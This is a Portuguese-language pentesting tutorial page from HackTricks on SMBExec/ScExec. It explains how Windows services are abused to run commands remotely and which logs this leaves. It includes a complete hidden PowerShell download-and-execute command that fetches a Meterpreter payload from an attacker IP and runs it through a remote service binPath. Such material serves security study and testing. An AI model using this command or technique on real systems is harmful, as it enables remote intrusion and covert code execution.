# SmbExec/ScExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Como funciona

**Smbexec funciona como o Psexec.** Neste exemplo, **em vez** de apontar o "_binpath_" para um executável malicioso dentro da vítima, vamos **apontá-lo** para **cmd.exe ou powershell.exe** e um deles irá baixar e executar o backdoor.

## **SMBExec**

Vamos ver o que acontece quando o smbexec é executado, olhando para ele do lado do atacante e do alvo:

![](../../.gitbook/assets/smbexec\_prompt.png)

Então, sabemos que ele cria um serviço "BTOBTO". Mas esse serviço não está presente na máquina de destino quando fazemos uma `sc query`. Os logs do sistema revelam uma pista do que aconteceu:

![](../../.gitbook/assets/smbexec\_service.png)

O nome do arquivo de serviço contém uma string de comando para executar (%COMSPEC% aponta para o caminho absoluto do cmd.exe). Ele ecoa o comando a ser executado para um arquivo bat, redireciona o stdout e stderr para um arquivo Temp, em seguida, executa o arquivo bat e o exclui. De volta ao Kali, o script Python então puxa o arquivo de saída via SMB e exibe o conteúdo em nosso "pseudo-shell". Para cada comando que digitamos em nosso "shell", um novo serviço é criado e o processo é repetido. É por isso que ele não precisa soltar um binário, ele apenas executa cada comando desejado como um novo serviço. Definitivamente mais furtivo, mas como vimos, um log de eventos é criado para cada comando executado. Ainda é uma maneira muito inteligente de obter um "shell" não interativo!

## SMBExec manual

**Ou executando comandos via serviços**

Como smbexec demonstrou, é possível executar comandos diretamente a partir de binPaths de serviço em vez de precisar de um binário. Este pode ser um truque útil para manter em seu bolso se você precisar apenas executar um comando arbitrário em uma máquina Windows de destino. Como um exemplo rápido, vamos obter um shell Meterpreter usando um serviço remoto _sem_ um binário.

Vamos usar o módulo `web_delivery` do Metasploit e escolher um alvo PowerShell com uma carga útil reversa do Meterpreter. O ouvinte é configurado e ele nos diz o comando a ser executado na máquina de destino:
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');  
```
A partir do nosso computador de ataque Windows, criamos um serviço remoto ("metpsh") e definimos o binPath para executar cmd.exe com nossa carga útil:

![](../../.gitbook/assets/sc_psh_create.png)

E então iniciamos:

![](../../.gitbook/assets/sc_psh_start.png)

Ele apresenta erro porque nosso serviço não responde, mas se olharmos para nosso ouvinte Metasploit, veremos que a chamada foi feita e a carga útil executada.

Todas as informações foram extraídas daqui: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
